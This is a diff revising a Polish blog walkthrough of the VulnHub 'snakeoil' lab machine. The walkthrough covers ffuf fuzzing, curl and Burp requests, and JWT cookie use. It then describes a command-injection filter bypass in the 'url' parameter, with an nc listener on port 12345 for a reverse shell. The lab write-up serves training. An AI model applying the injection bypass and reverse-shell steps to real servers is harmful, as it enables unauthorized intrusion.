@@ -20,20 +20,18 @@ gallery1_4:
     image_path: /assets/images/hacking/2021/10/03.png
   - url: /assets/images/hacking/2021/10/04.png
     image_path: /assets/images/hacking/2021/10/04.png
-gallery5_7:
-  - url: /assets/images/hacking/2021/10/05.png
-    image_path: /assets/images/hacking/2021/10/05.png
+gallery6_7:
   - url: /assets/images/hacking/2021/10/06.png
     image_path: /assets/images/hacking/2021/10/06.png
   - url: /assets/images/hacking/2021/10/07.png
     image_path: /assets/images/hacking/2021/10/07.png
 ---
 # Wstęp
-[digitalworld.local: snakeoil](https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/) jest ciekawą i nieszablonową maszyną z paru powodów: wykorzystane są tokeny **JWT**(JSON Web Token), **json**, możemy na niej przećwiczyć metody **HTTP** typu **GET**, **POST** w popularnych programach. Przećwiczymy to aż na trzech: tekstowy [Curl](https://curl.se/download.html) - link jest tutaj w sumie zbędny, posiada go chyba każde repozytorium, ale podaje dla formalności. Drugim programem będzie [Burp Suite](https://portswigger.net/burp) i trzecim, który ostatnio wpadł mi w oko jest [Postman](https://www.postman.com/) (w sumie znalazłem go na [YouTube](https://www.youtube.com/watch?v=RqqRScUwNlA). Tam też jest instrukcja, jak przejść **Snakeoil**. Ale zrobimy to po swojemu i się skupimy głównie na programach przechwytujące nagłówki, które wyżej wymieniłem.
+[digitalworld.local: snakeoil](https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/) jest ciekawą i nieszablonową maszyną z paru powodów: wykorzystane są tokeny **JWT** (JSON Web Token), format **JSON** (JavaScript Object Notation), możemy na niej przećwiczyć metody **HTTP** typu **GET**, **POST** w popularnych programach. Przećwiczymy to na trzech: tekstowy [Curl](https://curl.se/download.html) - link jest tutaj w sumie zbędny, posiada go chyba każde repozytorium, ale podaje dla formalności; drugim programem będzie [Burp Suite](https://portswigger.net/burp) i trzecim, który ostatnio wpadł mi w oko będzie [Postman](https://www.postman.com/) (w sumie znalazłem go na [YouTube](https://www.youtube.com/watch?v=RqqRScUwNlA). Tam też jest instrukcja, jak przejść **Snakeoil**. Ale zrobimy to po swojemu i się skupimy głównie na programach, które wyżej wymieniłem.
 {: .text-justify}
 # Zaczynamy
 ## Metasploit
-Jeżeli nie chcemy ciągle powtarzać tych samych czynności **Metasploit** umożliwia nam w pewnym sensie automatyzację. Wystarczy użyć **resource**. A jak to działa? Po prostu tworzymy komendy w pliku i potem uruchamiamy komendą **resource**. Prawda, że proste? 
+Jeżeli nie chcecie ciągle wpisywać tych samych komend, **Metasploit** umożliwia nam w pewnym sensie automatyzację. Wystarczy użyć polecenie **resource**. A jak to działa? Po prostu tworzymy komendy w pliku i potem uruchamiamy wpisując **resource [nazwa_zasobów]**. Prawda, że proste? 
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 ```bash
@@ -55,11 +53,11 @@ resource (/home/szikers/snackoil/snakeoil.rc)> db_nmap -A -p- 172.16.1.141
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
 ```
 </div>
-Jak widzimy są otwarte trzy porty. Ten co będzie nas interesować, to port 8080.
+Jak widzimy są otwarte trzy porty. Ten co będzie nas interesować, to jest port 8080.
 {: .text-justify}
 
 ## Ffuf
-**Ffuf** czyli **Fuzz Faster U Fool** jest bardzo szybkim fuzzerem bez natłoku funkcji. Wg. mnie ma wszystko co potrzeba. Zamiast **Dirb** lub **GoBuster** w tym artykule do skanowania użyjemy tylko powyższego fuzzera.
+**Ffuf** czyli **Fuzz Faster U Fool** jest bardzo szybkim fuzzerem bez natłoku funkcji. Wg. mnie ma wszystko co jest potrzebne. Zamiast **Dirb** lub **GoBuster** w tym artykule do skanowania użyjemy tylko powyższego fuzzera.
 {: .text-justify}
 ```console
 root@kali:/home/szikers# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.16.1.141:8080/FUZZ -mc all -fc 404
@@ -105,12 +103,13 @@ test                    [Status: 200, Size: 17, Words: 2, Lines: 2]
 users                   [Status: 200, Size: 267, Words: 9, Lines: 2]
 :: Progress: [4614/4614] :: Job [1/1] :: 779 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
 ```
-Prawdę mówiąc w tym wypadku **Dirb** dałby taki sam wynik, ale w **Ffuf** można stosować filtry, np. wyszukiwać tylko pliki, które zawierają słowo **password**.
+Prawdę mówiąc w tym wypadku **Dirb** dałby taki sam wynik, ale we **Ffuf** można stosować filtry, np. wyszukiwać tylko pliki, które zawierają słowo **password**.
+{: .text-justify}
 # Metody GET, POST
-Interesować nas będą pliki:  login, registration, run, users niekoniecznie. Jak widzicie, nie wszystkie mają kod powrotu **200**. Niektóre mają **405**, a to oznacza, że do przeszukiwania niektórych zasobów używaliśmy niedozwolonych metod, w tym wypadku **GET**, a **secret** ma **500**, czyli wewnętrzny błąd serwera. Do wszystkiego dojdziemy.
-## login, registration, users
+**Ffuf** znalazł trochę plików. Interesować nas zaś będą: **login**, **registration**, **run**, **secret**, zaś **users** niekoniecznie. Jak widzicie, podczas skanu nie wszystkie zwróciły kod powrotu **200**. Niektóre mają **405**, a to oznacza, że do przeszukiwania niektórych zasobów używaliśmy niedozwolonych metod - w tym wypadku **GET**. Plik **secret** ma kod **500**, czyli wewnętrzny błąd serwera. 
+{: .text-justify}
 ### curl
-Widzimy, że kod powrotu dla **login** wynosi **405**, czyli **GET** jest w tym wypadku niedozwoloną metodą. Uruchamiając program **Curl** z parametrem **-I** widzimy, że dozwolonymi metodami są **OPTIONS** i **POST**:
+Widzimy, że kod powrotu dla **login** wynosi **405**, więc **GET** jest w tym wypadku niedozwoloną metodą. Uruchamiając program **Curl** z parametrem **-I** widzimy, że metodami, które można użyć są **OPTIONS** i **POST**:
 {: .text-justify}
 ```console
 root@kali:/home/szikers# curl -I http://172.16.1.141:8080/login
@@ -137,37 +136,34 @@ root@kali:/home/szikers# curl -X POST -H "Content-Type: application/json" -d '{"
 Teraz mamy odpowiedź, że hasło nie może być puste. Kontynuujmy tę przepychankę w programie **Postman**.
 {: .text-justify}
 ### Postman
-
 {% include gallery id="gallery1_4" caption="Postman" %}
-
 Jak widzimy, nie ma użytkownika **snackoil**. Więc go zakładamy i nadajemy mu hasło poprzez [link](http://172.16.1.141:8080/create), potem się [logujemy](http://172.16.1.141:8080/login) i dostajemy token, który możemy sprawdzić na [stronie](https://jwt.io/)
-
-### Burp Suite
-Pozostaje nam wykorzystać link z końcówką **run**. Czyli najpierw wchodzimy na [link](http://172.16.1.141:8080/run) przez przeglądarkę i przechwytujemy nagłówek przez **Burp Suite**. Potem wchodzimy do sekcji **repeater**. Na początku dostajemy komunikat **Method Not Allowed**. Więc zamieniamy **GET** na **POST**, wpisujemy itd... Należy pamiętać, żeby dodać **Content-Type: application/json** do naszego wysyłanego nagłówka. Na poniższych rysunkach jest przedstawiona cała operacja:
 {: .text-justify}
-{% include gallery id="gallery5_7" caption="Burp Suite" %}
-
+![xcp](/assets/images/hacking/2021/10/05.png)
+### Burp Suite
+Pozostaje nam wykorzystać adres z końcówką **run**. Najpierw wchodzimy na [link](http://172.16.1.141:8080/run) przez przeglądarkę i przechwytujemy nagłówek poprzez **Burp Suite**. Potem przechodzimy do sekcji **repeater** i wysyłamy nagłówek. Podczas tej czynności dostajemy komunikat **Method Not Allowed**. Więc zamieniamy **GET** na **POST**. Należy pamiętać, żeby w nagłówku dodać **Content-Type: application/json**. Na poniższych rysunkach jest przedstawione jak to wygląda:
+{: .text-justify}
+{% include gallery id="gallery6_7" caption="Burp Suite" %}
 ### Curl
 Okazuje się, że potrzebujemy sekretnego klucza, który jest w urlu **http://172.16.1.141:8080/secret**:
-Wróćmy na chwilę do **Curl**-a, ale nie zamykajmy jeszcze okna w **Burp Suite**. Przechodzimy znowu na **Curl**-a. I to jest najtrudniejsza część w tym tutorialu. Wchodzimy na podany [link](https://flask-jwt-extended.readthedocs.io/en/stable/options/) frameworka **Flask**-a i tam się dowiadujemy, że opcja **JWT_ACCESS_COOKIE_NAME** umożliwia wysłanie nasz token przez ciasteczko, domyślnie nazywa się **access_token_cookie**.
+{: .text-justify}
+Wróćmy na chwilę do **Curl**-a, ale nie zamykajmy jeszcze okna w **Burp Suite**. Przechodzimy znowu do **Curl**-a. Wchodząc na podany [link](https://flask-jwt-extended.readthedocs.io/en/stable/options/) frameworka **Flask**-a się dowiadujemy, że opcja **JWT_ACCESS_COOKIE_NAME** umożliwia wysłanie nasz token poprzez ciasteczko, domyślnie się nazywa **access_token_cookie**.
 {: .text-justify}
 ![xcp](/assets/images/hacking/2021/10/08.png)
-Musimy podać nasz zdobyty klucz w ciasteczku i to wysłać na serwer:
+Wynika z tego, że musimy podać klucz w ciasteczku (Jak to zabrzmiało :smiley:) i wysłać na serwer:
 {: .text-justify}
-
 ```console
 root@kali:/home/szikers# curl --cookie "access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYzMTczNDE4NywianRpIjoiZjU4NDNhMmUtOTYzOC00NTFlLTg2NDktOTczMGQzNGUzZmUwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InNuYWNrb2lsIiwibmJmIjoxNjMxNzM0MTg3LCJleHAiOjE2MzE3MzUwODd9.18oenH8p5IsRYLes02qLICWh_wAYXvCxaVib_H-hbmQ"  http://172.16.1.141:8080/secret
 {"ip-address": "", "secret_key": "commandexecutionissecret"}
 ```
-    
 ### Burp Suite
-Mamy nasz sekretny klucz. Parametr **"url"** jest podatny na **command injection**. Niestety nie możemy wrzucić komand typu: **bash**, **/dev/tcp**. Skrypt na serwerze od razu je filtruje, ale możemy zrobić coś innego. Wrzucić klucz publiczny id_rsa.pub do katalogu .ssh, jak to zrobił na filmiku **InfoSecLab**, albo tak przerobić nasze komendy żeby przeszły filtry. Zrobimy to drugie. Stworzymy payload, ale małe litery zamienimy na duże, wrzucimy to wszystko do pliku, potem odwrócimy wielkość liter i uruchomimy nasz
- skrypt. Oczywiście można też inaczej uruchomić, np. zakodować do MD5, potem odkodować i uruchomić itd... ale wcześniej trzeba włączyć nasłuchiwanie na porcie **12345**.
-
+Mamy nasz sekretny klucz. Parametr **"url"** jest podatny na **command injection**. Niestety, nie możemy wrzucić stringów typu: **bash**, **/dev/tcp**, bo dostajemy bana. Skrypt na serwerze od razu filtruje te słowa, ale możemy zrobić coś innego. Wrzucić klucz publiczny **id_rsa.pub** do katalogu **.ssh**, jak to zrobił na filmiku **InfoSecLab**, albo tak przerobić nasz tekst żeby przeszedł filtry. Zrobimy to drugie. Stworzymy **payload**, który się będzie łączył na port **12345**, ale żeby to zadziałało, to najpierw małe litery w naszym ładunku zamienimy na duże, wrzucimy to wszystko do pliku, potem odwrócimy wielkość liter i uruchomimy nasz skrypt. Oczywiście można to inaczej zrobić, żeby zadziałało. Np. zakodować plik do **MD5**, potem odkodować, itd... ale zanim wrzucimy nasz ładunek, trzeba włączyć na naszym serwerze nasłuchiwanie na porcie **12345**.
+{: .text-justify}
 ```bash
 nc -lvp 12345
 ```
 A w naszym nagłówku umieszczamy takie coś:
+{: .text-justify}
 ```console
 POST /run HTTP/1.1
 Host: 172.16.1.141:8080
@@ -187,4 +183,7 @@ Content-Length: 227
 }
 ```
 # Koniec
-Jesteśmy na serwerze. Interesuje nas plik **flask_blog/app.py**. Tam znajdziecie co trzeba. Mam nadzieję, że ten tutorial pomógł wam trochę poćwiczyć **json**-a oraz metody **GET** i **POST**.
+Wysyłamy nagłówek i jesteśmy na **patrick@SNAKEOIL**. Na koniec podpowiem, że interesuje nas plik **flask_blog/app.py**. Tam znajdziecie co trzeba.
+{: .text-justify}
+Mam nadzieję, że ten tutorial pomógł wam trochę poćwiczyć **json**-a oraz metody **GET** i **POST**.
+{: .text-justify}
